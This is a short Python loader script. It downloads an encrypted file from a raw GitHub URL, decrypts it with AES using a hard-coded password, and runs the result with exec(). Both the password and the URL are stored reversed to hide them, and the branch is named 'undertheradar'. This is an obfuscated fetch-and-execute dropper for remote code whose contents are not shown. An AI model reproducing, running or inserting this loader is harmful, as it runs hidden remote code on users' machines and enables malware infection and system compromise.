from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import encodings.idna
import ssl
import urllib.request

# Your password (must match encryptor)
thechallenge = b"6202desreveR"
thechallenge=thechallenge[::-1]

SCODE_U = "detpyrcne.2tpircs_ruoy/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"
encrypted_data=urllib.request.urlopen(SCODE_U[::-1]).read()

# Extract salt, IV, and ciphertext
salt = encrypted_data[:16]
iv = encrypted_data[16:32]
ciphertext = encrypted_data[32:]

# Derive key
key = PBKDF2(thechallenge, salt, dkLen=32, count=100000)

# Decrypt
print("[+] Decrypting...")
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext).rstrip(b'\0')

# Execute decrypted script
print("[+] Executing decrypted code!")
exec(plaintext)